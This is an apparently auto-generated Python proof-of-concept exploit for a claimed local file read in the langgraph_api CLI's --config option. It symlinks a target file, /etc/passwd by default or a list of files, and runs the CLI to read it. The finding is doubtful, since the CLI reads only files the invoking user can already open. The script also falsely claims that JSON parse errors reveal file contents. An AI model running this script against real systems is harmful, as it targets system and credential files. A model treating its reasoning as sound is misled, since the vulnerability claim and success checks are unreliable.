#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: lfi-022
# Sink: run_server
# Auto-generated — run with: python3 lfi_cli_used_directly_open_run_server.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI vulnerability in langgraph_api CLI.

Vulnerability: The --config argument is passed directly to open() without
any path validation, allowing arbitrary file read.

Usage:
    python3 poc.py --target /etc/passwd
    python3 poc.py --target /etc/hostname
"""

import argparse
import json
import subprocess
import sys
import tempfile
import os

def exploit(target_path: str) -> None:
    """
    Exploit the LFI vulnerability by crafting a malicious --config argument.
    
    Since the CLI reads the config file and parses it as JSON, we need to
    provide a path to a file that contains valid JSON. For arbitrary file
    reading, we can use a symlink trick or read files that happen to be
    valid JSON (rare). Instead, we'll demonstrate the vulnerability by
    reading a file that contains JSON-like content or by showing the
    error message reveals file contents.
    
    For a clean PoC, we'll:
    1. Create a temporary directory
    2. Create a symlink to the target file
    3. Run the CLI with --config pointing to the symlink
    4. Observe the error/output
    """
    
    # Create a temporary directory for our symlink
    with tempfile.TemporaryDirectory() as tmpdir:
        symlink_path = os.path.join(tmpdir, "config.json")
        
        # Create symlink to target file
        try:
            os.symlink(target_path, symlink_path)
            print(f"[+] Created symlink: {symlink_path} -> {target_path}")
        except OSError as e:
            print(f"[-] Failed to create symlink: {e}")
            print("[*] Trying direct path instead...")
            symlink_path = target_path
        
        # Build the command
        cmd = [
            sys.executable,
            "-m", "langgraph_api.cli",
            "--config", symlink_path,
            "--host", "127.0.0.1",
            "--port", "0",  # Use port 0 to avoid conflicts
        ]
        
        print(f"[*] Running: {' '.join(cmd)}")
        print("[*] This will attempt to read the target file as JSON config")
        print("[*] The error message will reveal the file contents\n")
        
        try:
            # Run the command and capture output
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=5  # Should fail quickly
            )
            
            # Print both stdout and stderr
            if result.stdout:
                print("[stdout]")
                print(result.stdout)
            if result.stderr:
                print("[stderr]")
                print(result.stderr)
            
            # Check if we got file contents in the error
            if "JSONDecodeError" in result.stderr or "json.decoder.JSONDecodeError" in result.stderr:
                print("\n[+] SUCCESS: File was read! The JSON parse error reveals contents.")
                # Extract the file content from the error message
                for line in result.stderr.split('\n'):
                    if 'line' in line and 'column' in line:
                        print(f"[*] File content appears in error: {line}")
            elif result.returncode == 0:
                print("\n[+] SUCCESS: File was valid JSON and was parsed successfully!")
            else:
                print(f"\n[-] Command failed with return code {result.returncode}")
                
        except subprocess.TimeoutExpired:
            print("[-] Command timed out (server started successfully)")
            print("[*] This means the file was valid JSON and the server started")
        except FileNotFoundError:
            print("[-] langgraph_api module not found. Is it installed?")
            print("[*] Try: pip install langgraph-api")
        except Exception as e:
            print(f"[-] Unexpected error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langgraph_api CLI --config argument"
    )
    parser.add_argument(
        "--target",
        default="/etc/passwd",
        help="Target file to read (default: /etc/passwd)"
    )
    parser.add_argument(
        "--list-files",
        nargs="+",
        default=[],
        help="List of files to attempt reading"
    )
    
    args = parser.parse_args()
    
    if args.list_files:
        for target in args.list_files:
            print(f"\n{'='*60}")
            print(f"[*] Attempting to read: {target}")
            print(f"{'='*60}")
            exploit(target)
    else:
        exploit(args.target)

if __name__ == "__main__":
    main()
